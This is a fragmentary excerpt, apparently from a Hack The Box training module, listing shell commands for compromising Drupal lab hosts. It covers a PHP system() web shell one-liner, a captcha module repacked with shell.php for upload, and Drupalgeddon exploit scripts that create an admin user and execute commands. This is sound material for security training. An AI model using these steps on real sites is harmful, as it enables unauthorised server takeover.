...
```shell-session
realCustampin@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
...
```shell-session
realCustampin@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
...
```shell-session
realCustampin@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
realCustampin@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```
...
```shell-session
realCustampin@htb[/htb]$ mv shell.php .htaccess captcha
realCustampin@htb[/htb]$ tar cvf captcha.tar.gz captcha/
...
![Inlanefreight Blog update manager showing successful installation of captcha and next steps for module management.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/module_installed.png)
...
```shell-session
realCustampin@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
...
```shell-session
realCustampin@htb[/htb]$ python2.7 drupalgeddon.py 
...
```shell-session
realCustampin@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
...
![Drupal user management page showing filters for role, permission, and status, with users admin and hacker listed as active administrators.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/drupalgeddon.png)
...
```shell-session
realCustampin@htb[/htb]$ python3 drupalgeddon2.py 
...
```shell-session
realCustampin@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
...
```shell-session
realCustampin@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
...
```shell-session
realCustampin@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
...
![HTTP request details showing headers like User-Agent, Accept, and Cookie for drupal-acc.inlanefreight.local.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/burp.png)
